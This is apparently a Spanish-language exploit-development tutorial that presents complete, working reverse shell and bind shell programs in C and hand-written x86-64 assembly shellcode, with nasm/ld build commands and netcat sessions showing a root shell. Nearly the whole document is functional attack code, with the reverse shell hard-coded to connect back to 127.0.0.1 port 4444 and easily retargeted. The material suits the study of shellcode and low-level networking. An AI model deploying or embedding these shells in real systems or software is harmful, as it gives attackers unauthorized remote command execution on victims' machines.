
# Reverse shell

Shell que manda el servidor (victima) al cliente (atacante)

```c
#include<stdio.h>
#include<stdlib.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<netinet/in.h>
#include<error.h>
#include<strings.h>
#include<unistd.h>
#include<arpa/inet.h>

void main(int argc, char **argv) {
	// Primero definimos un struct "servidor" y sus caracteristicas
	struct sockaddr_in server; int sockaddr_len = sizeof(struct sockaddr_in); // definimos el struct "server" y su tamaño	
	server.sin_family = AF_INET; server.sin_port = htons(4444); // Conexion por Ipv4 y puerto 4444
    	server.sin_addr.s_addr = inet_addr("127.0.0.1"); // Direccion IP = localhost 
    	bzero(&server.sin_zero, 8); // la suma de lo anterior son 8 bytes, asi que alineamos la pila

    	// Lo siguiente es establecer dicha conexión, es decir crear un socket a partir del struct
	int sock = socket(AF_INET, SOCK_STREAM, 0); // Socket o conexión ipv4 TCP		
	connect(sock, (struct sockaddr *)&server, sockaddr_len); // establecer la conexión

	// Duplicar stdin, out y err al socket para hacer efectiva la shell (que tenga de donde leer y escribir)
	dup2(sock, 0); dup2(sock, 1); dup2(sock, 2);
	// Luego darle a execve (syscall) la /bin/sh/ como argumentos
	char *arguments[] = { "/bin/sh", 0 }; execve(arguments[0], &arguments[0], NULL); }	
```

Ejecutamos esto:

```bash
└─root@victima# ./rev     
└─user@atacante:$  nc -nlvp 4444 
listening on [any] 4444 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 48568
whoami
root
```

```c
global _start

_start:
;--------------------------------- STRUCT --------------------------------------------------------
	xor rax, rax 
	push rax
	mov dword [rsp-4], 0x0100007f ; server.sin_addr.s_addr = inet_addr("127.0.0.1") // 0x7f = 127 , va al reves
	mov word [rsp-6], 0x5c11      ; server.sin_port = htons(4444) // puerto 4444 <- hex(socket(htons(4444))) 
	mov word [rsp-8], 0x2	      ; server.sin_family = AF_INET  // AF_INET o sea Ipv4 se representa con un "2"
	sub rsp, 8		      ; bzero(&server.sin_zero, 8) // la suma de lo anterior son 8 bytes, asi que alineamos la pila
;-------------------------------- SOCKET -------------------------------------------------------------------------
    	mov rax, 41 		      ; sock = socket(AF_INET, SOCK_STREAM, 0)
	mov rdi, 2 		      ; AF_INET
	mov rsi, 1 		      ; SOCK_STREAM
	mov rdx, 0 		      ; 0
	syscall
	mov rdi, rax 		      ; rdi = sock
;-------------------------------- CONNECT -------------------------------------------------------------------------
	mov rax, 42 		      ; connect(sock, (struct sockaddr *)&server, sockaddr_len)
	mov rsi, rsp 		      ; rsp -> estructura de datos (ip,port)
	mov rdx, 16 		      ; tamaño de esa estructura
	syscall
;-------------------------------- DUP -------------------------------------------------------------------------
	mov rax, 33 		      ; duplicar al socket stdin, out y err
   	mov rsi, 0 		      ; dup2(sock, 0)
    	syscall
    	mov rax, 33	              ; dup2(sock, 1)
   	mov rsi, 1
   	syscall
    	mov rax, 33		      ; dup2(sock, 2);
    	mov rsi, 2
    	syscall
;-------------------------------- BIN BASH -------------------------------------------------------------------------
    ; execve("/bin/sh", 0),  explicado en otro articulo
    xor rax, rax 		      
    push rax
    mov rbx, 0x68732f2f6e69622f       ; "/bin/sh"
    push rbx
    mov rdi, rsp
    push rax
    mov rdx, rsp    
    push rdi
    mov rsi, rsp
    add rax, 59			      ; execve (syscall numero 59)
    syscall
```
Compilarlo
```
└─root@kali# nasm -felf64 RevShell.nasm -o rev.o                                                                                                                   
└─root@kali# ld rev.o -o rev                                           
```


--------------------------------------

# Bind Shell

Shell que manda el cliente (victima) al servidor (atacante)

```c
#include<stdio.h>
#include<stdlib.h>
#include<sys/socket.h>
#include<sys/types.h>
#include<netinet/in.h>
#include<error.h>
#include<strings.h>
#include<unistd.h>
#include<arpa/inet.h>
// listen, accept connection and spawn a shell on the local system.
void main(int argc, char **argv){

    // --------------- Creamos un struct para cliente y servidor(ip, puerto), su tamaño de objeto en memoria.
    struct sockaddr_in server; struct sockaddr_in client; int sockaddr_len = sizeof(struct sockaddr_in);
    server.sin_family = AF_INET; server.sin_port = htons(atoi(argv[1])); server.sin_addr.s_addr = INADDR_ANY;  
    bzero(&server.sin_zero, 8);

    // ------ Creamos un socket para la conexion, de IPV4 y TCP ---------------------------------------------
	int sock = socket(AF_INET, SOCK_STREAM, 0);
    // Nos conectamos al servidor (pasamos el socket, sus propiedades y su tamaño). El socket escucha al cliente
	bind(sock, (struct sockaddr *)&server, sockaddr_len); listen(sock, 2); // 2 conexiones (cliente/servidor)
    // Una vez el servidor este en escucha, esperamos a un cliente que se nos conecte (conn) -> nc localhost 4444
	int conn = accept(sock, (struct sockaddr *)&client, &sockaddr_len); // nuevo socket para la shell ----------
	close(sock); // Cerramos el socket original una vez se nos han conectado (ahora tenemos "conn") ------------
	dup2(conn, 0); dup2(conn, 1); dup2(conn, 2); // stdin, stdout y stderr pasan al cliente conectado.----------
	char *arguments[] = { "/bin/sh", 0 }; execve(arguments[0], &arguments[0], NULL);} // ejecutamos /bin/sh ----
```

```bash
└─root@victima#  ./bind 4444
└─user@atacante:$ nc localhost 4444                                                                                             1 ⨯
whoami
root
```




```c
global _start
_start:
    	mov rax, 41 		      ; sock = socket(AF_INET, SOCK_STREAM, 0)
	mov rdi, 2 		      ; AF_INET
	mov rsi, 1 		      ; SOCK_STREAM
	mov rdx, 0 		      ; 0
	syscall

	mov rdi, rax 	; guardamos en rdi el sock (que es el retorno del syscall anterior)
;--------------------------------- STRUCT --------------------------------------------------------
	xor rax, rax  		    ;// los argumentos van a ir al reves
	push rax     		    ;// rax = 0 -> // bzero(&server.sin_zero, 8)
	mov dword [rsp-4], eax      ;// server.sin_addr.s_addr = INADDR_ANY (00 00 00 00)
	mov word [rsp-6], 0x5c11    ;// server.sin_port = htons(4444) // puerto 4444 <- hex(socket(htons(4444))) 
	mov word [rsp-8], 0x2       ;// server.sin_family = AF_INET // AF_INET o sea Ipv4 se representa con un "2"
	sub rsp, 8                  ;// bzero(&server.sin_zero, 8) // la suma de lo anterior son 8 bytes, asi que alineamos la pila

	mov rax, 49  		 ;// bind(sock, (struct sockaddr *)&server, sockaddr_len)
	mov rsi, rsp 		 ;// sock ya esta en RDI, el server struct esta en rsp y lo pasamos a RSI
	mov rdx, 16 		 ;// sockaddr_len: el tamaño de la direccion del socket, 16 bits, a RDX
	syscall
;-------------------------------- LISTEN -------------------------------------------------------------------------
	mov rax, 50  ;// listen(sock, MAX_CLIENTS)
	mov rsi, 2   ;// rdi es sock ya y RSI es 2, o sea hay dos sockets (cliente y servidor)
	syscall
;-------------------------------- ACCEPT -------------------------------------------------------------------------
	mov rax, 43		;// new = accept(sock, (struct sockaddr *)&client, &sockaddr_len). Accpet es el syscall 43.
	sub rsp, 16 		;// rdi ya es sock, en rsp alocamos 16 bytes (que llenara el socket accept)
	mov rsi, rsp	 	;// y ese struct irá a RSI <- (struct sockaddr *)&client
        mov byte [rsp-1], 16 	;// alienamos la pila
        sub rsp, 1   
        mov rdx, rsp 		;// lo mete en rdx <- &sockaddr_len
        syscall 		;// accept bloquea llamada y solo escucha.
;---------------------------------------------------------------------------------------------------------------
	mov r9, rax 		;// guardamos el socket cliente en r9
        mov rax, 3 		;// cerramos el padre (syscall 3 = close) rdi ya tiene el socket
        syscall      
;---------------------------------------------------------------------------------------------------------------

        mov rdi, r9 		 ;//  duplicar al socket stdin, out y err, como con la reverse shell
        mov rax, 33
        mov rsi, 0
        syscall
        mov rax, 33
        mov rsi, 1
        syscall
        mov rax, 33
        mov rsi, 2
        syscall

        ; execve
        xor rax, rax
        push rax
        mov rbx, 0x68732f2f6e69622f
        push rbx
        mov rdi, rsp
        push rax
        mov rdx, rsp
        push rdi
        mov rsi, rsp
        add rax, 59
        syscall
```

